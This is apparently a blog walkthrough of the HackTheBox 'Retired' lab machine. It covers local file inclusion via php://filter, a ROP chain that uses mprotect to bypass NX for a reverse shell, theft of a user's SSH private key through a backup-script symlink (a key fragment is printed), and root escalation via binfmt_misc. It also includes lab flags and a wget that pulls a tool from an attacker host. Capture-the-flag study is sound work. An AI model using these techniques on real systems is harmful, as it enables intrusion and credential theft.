---
layout: post
title: HackTheBox - Retired
tags: [security, hackthebox, ctf]
gh-repo: Jayden-Lind/HTB-Retired
---

# HTB - Retired walkthrough

![image](/img/2022/06/Retired.png)

Retired box is a medium rated difficulty box, but for me personally it was a hard box. I've never done any sort of binary exploitation before and because of that, this box took me a good 30+ hours to solve.

I overall found this really fun, and I'm glad I did this box, as I learned a lot about binary exploitation, even if it was only a specific type.

## Initial

Start with nmap scan on the remote host: `10.10.11.154`

```sh
┌─[jayden@JD-Desktop]─[~/ctf/retired]
└──╼ $nmap -sC -sV -p- 10.10.11.154
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-21 22:45 AEST
Nmap scan report for 10.10.11.154
Host is up (0.015s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 77:b2:16:57:c2:3c:10:bf:20:f1:62:76:ea:81:e4:69 (RSA)
|   256 cb:09:2a:1b:b9:b9:65:75:94:9d:dd:ba:11:28:5b:d2 (ECDSA)
|_  256 0d:40:f0:f5:a8:4b:63:29:ae:08:a1:66:c1:26:cd:6b (ED25519)
80/tcp open  http    nginx
| http-title: Agency - Start Bootstrap Theme
|_Requested resource was /index.php?page=default.html
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.65 seconds
```

Let's checkout the webpage, which redirects us to `http://10.10.11.154/index.php?page=default.html`.

This looks like a LFI (Local File Inclusion) straight away. Let's FUZZ this and find some pages.

```sh
┌─[jayden@JD-Desktop]─[~/ctf/retired]
└──╼ $ffuf -u http://10.10.11.154/index.php?page=FUZZ.html -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -t 10 -fs 0 -s
default
beta
```

We can see a beta.html, which allows us to upload a license file. Intercepting the upload request through burpsuite, we can see it POST's to `activate_license.php`.

![image](/img/2022/06/image-5.png){:height="65%" width="65%"}

Now let's try to leverage what appears to be this LFI, and grab the `index.php`, `activate_license.php` and `beta.php`

```sh
┌─[jayden@JD-Desktop]─[~/ctf/retired]
└──╼ $curl http://10.10.11.154/index.php?page=php://filter/resource=index.php
<?php
function sanitize_input($param) {
    $param1 = str_replace("../","",$param);
    $param2 = str_replace("./","",$param1);
    return $param2;
}
$page = $_GET['page'];
if (isset($page) && preg_match("/^[a-z]/", $page)) {
    $page = sanitize_input($page);
} else {
    header('Location: /index.php?page=default.html');
}
readfile($page);
?>
┌─[jayden@JD-Desktop]─[~/ctf/retired]
└──╼ $curl http://10.10.11.154/index.php?page=php://filter/resource=activate_license.php --output -
<?php
if(isset($_FILES['licensefile'])) {
    $license      = file_get_contents($_FILES['licensefile']['tmp_name']);
    $license_size = $_FILES['licensefile']['size'];
    $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
    if (!$socket) { echo "error socket_create()\n"; }
    if (!socket_connect($socket, '127.0.0.1', 1337)) {
        echo "error socket_connect()" . socket_strerror(socket_last_error()) . "\n";
    }
    socket_write($socket, pack("N", $license_size));
    socket_write($socket, $license);
    socket_shutdown($socket);
    socket_close($socket);
}
?>
┌─[jayden@JD-Desktop]─[~/ctf/retired]
└──╼ $curl http://10.10.11.154/index.php?page=php://filter/resource=/proc/self/cmdline --output -
php-fpm: pool www
```

We have LFI, and can now look for other running processes by enumerating through /proc/PID/cmdline, and we can automate this through a quick python script that I wrote [PID Scanner](https://github.com/Jayden-Lind/HTB-Retired/blob/master/pid_scanner.py).

```sh
┌─[jayden@JD-Desktop]─[~/ctf/retired]
└──╼ $python pid_scanner.py 
401
/usr/bin/activate_license1337
545
nginx: worker process
546
nginx: worker process
561
php-fpm: pool www
562
php-fpm: pool www
```

The interesting process from this output, is this PID of 401 with the cmdline of /usr/bin/activate_license 1337. Let's pull this binary down through the LFI, try to play around with it, and then open it up through Ghidra to try and understand it.

```sh
┌─[jayden@JD-Desktop]─[~/ctf/retired]
└──╼ $curl http://10.10.11.154/index.php?page=php://filter/resource=/proc/401/exe --output activate_license
% Total % Received % Xferd Average Speed Time Time Time Current
Dload Upload Total Spent Left Speed
100 22536 0 22536 0 0 400k 0 --:--:-- --:--:-- --:--:-- 400
┌─[✗]─[jayden@JD-Desktop]─[~/ctf/retired]
└──╼ $./activate_license
Error: specify port to bind to
┌─[✗]─[jayden@JD-Desktop]─[~/ctf/retired]
└──╼ $./activate_license 1337
[+] starting server listening on port 1337
[+] listening …
```

Using [pwntools](https://docs.pwntools.com/en/stable/) we can check if there's any quick and easy avenues on this particular binary. Which based on the output below, shows no easy wins.

```sh
┌─[✗]─[jayden@JD-Desktop]─[~/ctf/retired]
└──╼ $pwn checksec activate_license
[*] '/home/jayden/ctf/retired/activate_license'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

We can open this up in Ghidra and see what this binary is actually doing. 

![image](/img/2022/06/image-1.png){:height="65%" width="65%"}

The main function is just setting up the socket to listen to, which we can see in activate_license.php, as it connects to a socket on port 1337. Now lets checkout the activate_license function.

![image](/img/2022/06/image-2.png){:height="65%" width="65%"}

Through the Ghidra screenshots we can see that in line 14 of activate_license function, it reads the first 4 bytes of this first message in the socket and updates the msglen buffer to that result.

```
sVar2 = read(sockfd,&msglen,4);
```

Later down on line 22 it then reads the second message from this socket, and reads `msglen` length from the socket into the buffer BUT this buffer is only 512 char long. This will allow us to overflow later.

```
sVar2 = read(sockfd,buffer,(ulong)msglen);
```

By researching up on binary exploitation, John Hammonds [Video](https://www.youtube.com/watch?v=i5-cWI_HV8o&t=896s) explains the idea of ROP (Return Oriented Programming) really well. Our binary is different from this example, but we can use this as a basis point.

What we can do is look at using this overflow to then bypass the NX (No eXecute) on the stack by calling mprotect() on the stack address space, making the stack executable. An okay example of this is [Bypass NX with mprotect](https://syrion.me/blog/elfx64-bypass-nx-with-mprotect/), but the instructions skip over some steps, and dont explain enough of the steps.

But this is not enough, as we need a way to execute the stack, and that can be done with a "jmp rsp" (jump to stack pointer) and we can use the [jmp rsp](https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/using-rsp) instructionsto execute what we put on the stack.

### High Level Overview:

We need to get the address of mprotect on the stack, the return addresses to pop the parameters we want to use in mprotect() in the stack, so that mprotect() can then be executed to make the stack executable and then execute our code through a jmp rsp instruction.

First we need to find the offset, which will allow us to cleanly put what we want on the stack. This can be seen in [Bypass NX with mprotect](https://syrion.me/blog/elfx64-bypass-nx-with-mprotect/). I can see that the offset ends up being 520 bytes (convenient 512 + 8 Bytes). 

Script to find offset - [pwntool-test.py](https://github.com/Jayden-Lind/HTB-Retired/blob/master/pwntool-test.py)

```sh
pwndbg> 
Temporary breakpoint 9 at 0x555555555370: file activate_license.c, line 23.
[+] reading 1000 bytes
[+] activated license: CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
Thread 2.1 "activate_licens" received signal SIGSEGV, Segmentation fault.
0x00005555555555c0 in activate_license (sockfd=4) at activate_license.c:64
64      in activate_license.c
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────────
*RAX  0x260
 RBX  0x0
*RCX  0x0
*RDX  0x7ffff7b380c0 ◂— 0x7ffff7b380c0
*RDI  0x7fffffffd790 —▸ 0x7ffff7cfd090 (funlockfile) ◂— mov    rdi, qword ptr [rdi + 0x88]
*RSI  0x0
*R8   0xfffffffffffffff7
*R9   0x260
*R10  0x7fffffffdd20 ◂— 0x4343434343434343 ('CCCCCCCC')
 R11  0x246
 R12  0x555555555220 (_start) ◂— xor    ebp, ebp
 R13  0x0
 R14  0x0
 R15  0x0
*RBP  0x4343434343434343 ('CCCCCCCC')
*RSP  0x7fffffffdf28 ◂— 'DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD'
*RIP  0x5555555555c0 (activate_license+643) ◂— ret    
──────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────
 ► 0x5555555555c0 <activate_license+643>    ret    <0x4444444444444444>





──────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffdf28 ◂— 'DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD'
... ↓        7 skipped
────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────
 ► f 0   0x5555555555c0 activate_license+643
   f 1 0x4444444444444444
   f 2 0x4444444444444444
   f 3 0x4444444444444444
   f 4 0x4444444444444444
   f 5 0x4444444444444444
   f 6 0x4444444444444444
   f 7 0x4444444444444444
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> 
```

We then just follow the same instructions as [Bypass NX with mprotect](https://syrion.me/blog/elfx64-bypass-nx-with-mprotect/) but with some exceptions. We will use the libc and sqlite3 library to help us with some of the stack pops and the eventual "jmp rsp". The likelihood that a library will have the "jmp rsp" instruction anywhere is unlikely, but luckily sqlite3 does have it.

Now let's find these stack pops, libc address and the mprotect() address.

```sh
┌─[jayden@JD-Desktop]─[~/ctf/retired]
└──╼ $gdb activate_license 
Reading symbols from activate_license...
pwndbg> set args 1337
pwndbg> run
Starting program: /home/jayden/ctf/retired/activate_license 1337
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[+] starting server listening on port 1337
[+] listening ...
^C
Program received signal SIGINT, Interrupt.
pwndbg> p mprotect 
$1 = {<text variable, no debug info>} 0x7ffff7d9dc20 <mprotect>
┌─[✗]─[jayden@JD-Desktop]─[~/ctf/retired]
└──╼ $ROPgadget --binary activate_license | grep -i "pop rdi"
0x000000000000181b : pop rdi ; ret
┌─[jayden@JD-Desktop]─[~/ctf/retired]
└──╼ $ROPgadget --binary /lib/x86_64-linux-gnu/libc-2.31.so | grep -i "pop rsi ; ret"
0x000000000002890f : pop rsi ; ret
┌─[jayden@JD-Desktop]─[~/ctf/retired]
└──╼ $ROPgadget --binary /lib/x86_64-linux-gnu/libc-2.31.so | grep -i "pop rdx ; ret"
0x00000000000cb1cd : pop rdx ; ret
┌─[jayden@JD-Desktop]─[~/ctf/retired]
└──╼ $ROPgadget --binary /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6 | grep -i "jmp rsp"
0x00000000000d431d : jmp rsp
```

We now have the offsets needed, but require the libc base address, libsqlite3 base address. We can grab this from running vmmap inside gdb when the process is running, and grab the first occurence of the loaded module, and that is the base address of this module on the local system.

```sh
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
....
    0x7ffff7ca5000    0x7ffff7cca000 r--p    25000 0      /lib/x86_64-linux-gnu/libc-2.31.so
....
    0x7ffff7e6a000     0x7ffff7e7a000 r--p    10000 0      /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
....
pwndbg> 
```

If we now execute activate_license, and run the [pwntool-local.py](https://github.com/Jayden-Lind/HTB-Retired/blob/master/pwntool-local.py) in another terminal, then open a netcat listener shell, we will get a reverse shell back, which was executed by the activate_license binary.

```sh
┌─[✗]─[jayden@JD-Desktop]─[~/ctf/retired]
└──╼ $nc -nvlp 4444
Listening on 0.0.0.0 4444
Connection received on 127.0.0.1 50862
pwd 
/home/jayden/ctf/retired
```

Switch back to gdb

```sh
pwndbg: loaded 198 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from activate_license…
pwndbg> set args 1337
pwndbg> run
Starting program: /home/jayden/ctf/retired/activate_license 1337
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[+] starting server listening on port 1337
[+] listening …
[+] accepted client connection from 0.0.0.0:0
[Attaching after Thread 0x7ffff7b380c0 (LWP 7853) fork to child process 7938]
[New inferior 2 (process 7938)]
[Detaching after fork from parent process 7853]
[Inferior 1 (process 7853) detached]
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[+] reading 1000 bytes
[+] activated license: CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC�����
process 7938 is executing new program: /bin/dash
```

Now time for exploiting this on the remote machine.
Since we have LFI, we can check the /proc/*pid*/maps to see the vmmap of the remote process, which will allow us to get the base addresses of loaded libraries, and also download those versions of the libraries (as they may be different to our local machine) and discover some ROP gadgets to chain to get our code exectution.

```sh
┌─[jayden@JD-Desktop]─[~/ctf/retired]
└──╼ $wget http://10.10.11.154/index.php?page=php://filter/resource=/usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6 -O libsqlite3.so.0.8.6
```

```sh
┌─[✗]─[jayden@JD-Desktop]─[~/ctf/retired]
└──╼ $ROPgadget --binary libsqlite3.so.0.8.6 | grep -i "jmp rsp"
0x00000000000d431d : jmp rsp
```

The end result ends up being this script I wrote [pwntool-remote.py](https://github.com/Jayden-Lind/HTB-Retired/blob/master/pwntool-remote.py).

Update our reverse shell binary, point to our VPN IP, and set up a listener on port 4444, and let's see what we get back.

```sh
┌─[jayden@JD-Desktop]─[~/ctf/retired]
└──╼ $nc -nvlp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.11.154 52972
Upgrade to full reverse shell: https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
www-data@retired:/var/www$ ls -la
total 1512
drwxrwsrwx  3 www-data www-data   4096 Jun 19 10:24 .
drwxr-xr-x 12 root     root       4096 Mar 11 14:36 ..
-rw-r--r--  1 dev      www-data 505153 Jun 19 10:22 2022-06-19_10-22-01-html.zip
-rw-r--r--  1 dev      www-data 505153 Jun 19 10:23 2022-06-19_10-23-01-html.zip
-rw-r--r--  1 dev      www-data 505153 Jun 19 10:24 2022-06-19_10-24-01-html.zip
drwxrwsrwx  5 www-data www-data   4096 Mar 11 14:36 html
-rw-r--r--  1 www-data www-data  12288 Jun 19 10:21 license.sqlite
www-data@retired:/var/www$ 
```

## Success! 

We got a shell on the remote box, now let's try to enumerate more.

First thing we see is these zip files being created locally every minute. Let's run [linpeas](https://github.com/carlospolop/PEASS-ng) and see if we can find anything useful.

```sh
www-data@retired:/var/www$ ls -la
total 1512
drwxrwsrwx  3 www-data www-data   4096 Jun 22 10:29 .
drwxr-xr-x 12 root     root       4096 Mar 11 14:36 ..
-rw-r--r--  1 dev      www-data 505153 Jun 22 10:27 2022-06-22_10-27-01-html.zip
-rw-r--r--  1 dev      www-data 505153 Jun 22 10:28 2022-06-22_10-28-08-html.zip
-rw-r--r--  1 dev      www-data 505153 Jun 22 10:29 2022-06-22_10-29-02-html.zip
drwxrwsrwx  5 www-data www-data   4096 Mar 11 14:36 html
-rw-r--r--  1 www-data www-data  12288 Jun 22 10:29 license.sqlite
www-data@retired:/var/www$ wget http://10.10.14.30/linpeas.sh
--2022-06-22 10:34:54--  http://10.10.14.30/linpeas.sh
Connecting to 10.10.14.30:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 776776 (759K) [text/x-sh]
Saving to: ‘linpeas.sh’
linpeas.sh          100%[===================>] 758.57K  2.49MB/s    in 0.3s    
2022-06-22 10:34:54 (2.49 MB/s) - ‘linpeas.sh’ saved [776776/776776]
www-data@retired:/var/www$ chmod +x linpeas.sh 
www-data@retired:/var/www$ ./linpeas.sh 
╔══════════╣ Backup files (limited 100)
-rwxr-xr-x 1 root root 485 Oct 13  2021 /usr/bin/webbackup
```

We find an interesting file, looks like a the shell script that is outputting those files into /var/www/. And since these zip files are owned by user "dev" we can assume it's running under the "dev" user. So let's try and see if dev has a private SSH key.

```sh
www-data@retired:/var/www$ cat /usr/bin/webbackup 
#!/bin/bash
set -euf -o pipefail
cd /var/www/
SRC=/var/www/html
DST="/var/www/$(date +%Y-%m-%d_%H-%M-%S)-html.zip"
/usr/bin/rm --force -- "$DST"
/usr/bin/zip --recurse-paths "$DST" "$SRC"
KEEP=10
/usr/bin/find /var/www/ -maxdepth 1 -name '*.zip' -print0 \
    | sort --zero-terminated --numeric-sort --reverse \
    | while IFS= read -r -d '' backup; do
        if [ "$KEEP" -le 0 ]; then
            /usr/bin/rm --force -- "$backup"
        fi
        KEEP="$((KEEP-1))"
    done
www-data@retired:/var/www/html$ ln -s /home/dev/.ssh/id_rsa .
┌─[jayden@JD-Desktop]─[~/ctf/retired]
└──╼ $wget http://10.10.11.154/index.php?page=php://filter/resource=/var/www/2022-06-19_12-28-01-html.zip -O html.zip
┌─[jayden@JD-Desktop]─[~/ctf/retired]
└──╼ $unzip html.zip
Archive:  html.zip
  inflating: var/www/html/id_rsa
┌─[jayden@JD-Desktop]─[~/ctf/retired]
└──╼ $cat var/www/html/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA58qqrW05/urHKCqCgcIPhGka60Y+nQcngHS6IvG44gcb3w0HN/yf
```

```sh
┌─[jayden@JD-Desktop]─[~/ctf/retired]
└──╼ $ssh -i id_rsa dev@10.10.11.154
Linux retired 5.10.0-11-amd64 #1 SMP Debian 5.10.92-2 (2022-02-28) x86_64
The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Mar 28 11:36:17 2022 from 10.10.14.23
dev@retired:~$ cat user.txt
554c6e854251a377cdc59e4b4d6f2cde
dev@retired:~$
```

## User Owned!

Now let's have a look at root. Let's run linpeas again as the dev user and see if we can find anything.

```sh
dev@retired:/var/www$ /var/www/linpeas.sh 
╔══════════╣ Readable files belonging to root and readable by me but not world readable
-rwxr-x--- 1 root dev 16864 Oct 13  2021 /usr/lib/emuemu/reg_helper
-rw-r----- 1 root dev 33 Jun 22 04:27 /home/dev/user.txt
dev@retired:~$ ls -la /usr/lib/emuemu/reg_helper 
-rwxr-x--- 1 root dev 16864 Oct 13  2021 /usr/lib/emuemu/reg_helper
```

This reg_helper binary is interesting, let's browse around in the "dev" users home directory. Looks like reg_helper is binary that was written/compiled on this box and we can see the source code.

```sh
dev@retired:~$ ls -la /home/dev/emuemu/
total 68
drwx------ 3 dev dev  4096 Mar 11 14:36 .
drwx------ 6 dev dev  4096 Mar 11 14:36 ..
-rw------- 1 dev dev   673 Oct 13  2021 Makefile
-rw------- 1 dev dev   228 Oct 13  2021 README.md
-rw------- 1 dev dev 16608 Oct 13  2021 emuemu
-rw------- 1 dev dev   168 Oct 13  2021 emuemu.c
-rw------- 1 dev dev 16864 Oct 13  2021 reg_helper
-rw------- 1 dev dev   502 Oct 13  2021 reg_helper.c
drwx------ 2 dev dev  4096 Mar 11 14:36 test
dev@retired:~/emuemu$ cat reg_helper.c 
#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
int main(void) {
    char cmd[512] = { 0 };
    read(STDIN_FILENO, cmd, sizeof(cmd)); cmd[-1] = 0;
    int fd = open("/proc/sys/fs/binfmt_misc/register", O_WRONLY);
    if (-1 == fd)
        perror("open");
    if (write(fd, cmd, strnlen(cmd,sizeof(cmd))) == -1)
        perror("write");
    if (close(fd) == -1)
        perror("close");
    return 0;
}
dev@retired:~/emuemu$ 
```

We can see what looks like this [binfmt_misc](https://github.com/toffan/binfmt_misc), which will allow us to priv esc to root. Running this payload directly on the box fails, as we don't have direct write access to "/proc/sys/fs/binfmt_misc/register", but we do through "reg_helper", which can be seen below, as the error it's failing on is the write command.

```sh
dev@retired:~$ /usr/lib/emuemu/reg_helper 
fdafdsafdsaf
write: Invalid argument
dev@retired:~$ 
```

All we need to do, is pass the binfmt line to the reg_helper STDIN and we will get a root shell!

Using [exploit.sh](https://github.com/Jayden-Lind/HTB-Retired/blob/master/exploit.sh) we can get a root shell.

```sh
dev@retired:~$ vi exploit.sh
dev@retired:~$ chmod +x ./exploit.sh 
dev@retired:~$ ./exploit.sh 
uid=0(root) euid=0(root)
# whoami
root
# cat root.txt
cat: root.txt: No such file or directory
# cat /root/root.txt
c8a25a84ec484df4652a44291fa86c1a
# 
```

## Root owned!
